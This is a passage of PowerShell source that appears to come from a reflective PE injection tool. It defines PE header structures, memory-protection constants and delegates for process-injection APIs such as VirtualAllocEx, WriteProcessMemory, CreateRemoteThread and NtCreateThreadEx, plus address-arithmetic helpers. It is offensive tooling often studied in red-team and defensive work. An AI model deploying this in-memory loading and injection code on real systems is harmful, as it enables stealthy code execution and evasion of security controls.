		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		    #Struct IMAGE_NT_HEADERS64
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		    $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		    $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		    $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		    #Struct IMAGE_NT_HEADERS32
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		    $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		    $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		    $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		    #Struct IMAGE_DOS_HEADER
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		    $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		    $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		    $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		    $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		    $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		    $e_resField.SetCustomAttribute($AttribBuilder)

		    $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		    $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		    $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		    $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		    $e_res2Field.SetCustomAttribute($AttribBuilder)

		    $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		    $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		    #Struct IMAGE_SECTION_HEADER
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		    $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		    $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		    $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		    $nameField.SetCustomAttribute($AttribBuilder)

		    $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		    $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		    #Struct IMAGE_BASE_RELOCATION
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		    $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		    $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		    #Struct IMAGE_IMPORT_DESCRIPTOR
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		    $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		    $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		    #Struct IMAGE_EXPORT_DIRECTORY
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		    $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		    $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		    #Struct LUID
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		    $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		    $LUID = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		    #Struct LUID_AND_ATTRIBUTES
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		    $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		    $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		    $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		    #Struct TOKEN_PRIVILEGES
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		    $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		    $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		    return $Win32Types
	    }

	    Function Get-Win32Constants
	    {
		    $Win32Constants = New-Object System.Object
		
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		    return $Win32Constants
	    }

	    Function Get-Win32Functions
	    {
		    $Win32Functions = New-Object System.Object
		
		    $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		    $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		    $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		    $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		    $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		    $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		    $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		    $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		    $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		    $memsetAddr = Get-ProcAddress msvcrt.dll memset
		    $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		    $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		    $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		    $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		    $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		    $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		    $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		    $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		    $GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
		    $GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		    $GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
		
		    $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		    $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		    $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		    $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		    $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		    $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		    $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		    $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		    $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		    $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		    $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		    $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		    $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		    $FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		    $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		    $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		    $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
            $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
            $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		    $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
            $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
            $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		    $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
            $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
            $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		    $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
            $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
            $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		    $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
            $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
            $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		    $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
            $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
            $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		    $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
            $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
            $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		    $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
            $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
            $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		    $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
            $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
            $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
		
		    $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
            $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
            $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		    $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
            $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
            $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		    return $Win32Functions
	    }
	    #####################################

			
	    #####################################
	    ###########    HELPERS   ############
	    #####################################

	    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	    Function Sub-SignedIntAsUnsigned
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Int64]
		    $Value1,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [Int64]
		    $Value2
		    )
		
		    [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		    [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		    [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		    if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		    {
			    $CarryOver = 0
			    for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			    {
				    $Val = $Value1Bytes[$i] - $CarryOver
				    #Sub bytes
				    if ($Val -lt $Value2Bytes[$i])
				    {
					    $Val += 256
					    $CarryOver = 1
				    }
				    else
				    {
					    $CarryOver = 0
				    }
				
				
				    [UInt16]$Sum = $Val - $Value2Bytes[$i]

				    $FinalBytes[$i] = $Sum -band 0x00FF
			    }
		    }
		    else
		    {
			    Throw "Cannot subtract bytearrays of different sizes"
		    }
		
		    return [BitConverter]::ToInt64($FinalBytes, 0)
	    }
	

	    Function Add-SignedIntAsUnsigned
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Int64]
		    $Value1,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [Int64]
		    $Value2
		    )
		
		    [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		    [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		    [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		    if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		    {
			    $CarryOver = 0
			    for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			    {
				    #Add bytes
				    [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				    $FinalBytes[$i] = $Sum -band 0x00FF
				
				    if (($Sum -band 0xFF00) -eq 0x100)
				    {
					    $CarryOver = 1
				    }
				    else
				    {
					    $CarryOver = 0
				    }
			    }
		    }
		    else
		    {
			    Throw "Cannot add bytearrays of different sizes"
		    }
		
		    return [BitConverter]::ToInt64($FinalBytes, 0)
	    }
	

	    Function Compare-Val1GreaterThanVal2AsUInt
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Int64]
		    $Value1,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [Int64]
		    $Value2
		    )
		
		    [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		    [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		    if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		    {
			    for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			    {
				    if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				    {
					    return $true
				    }
				    elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				    {
					    return $false
				    }
			    }
		    }
		    else
		    {
			    Throw "Cannot compare byte arrays of different size"
		    }
		
		    return $false
	    }
	

	    Function Convert-UIntToInt
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [UInt64]
		    $Value
		    )
		
		    [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		    return ([BitConverter]::ToInt64($ValueBytes, 0))
	    }
	
	
	    Function Test-MemoryRangeValid
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [String]
		    $DebugString,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [IntPtr]
		    $StartAddress,
		
		    [Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
		    [IntPtr]
		    $EndAddress,
		
		    [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		    [IntPtr]
		    $Size
		    )
		
		    [IntPtr]$FinalEndAddress = [IntPtr]::Zero
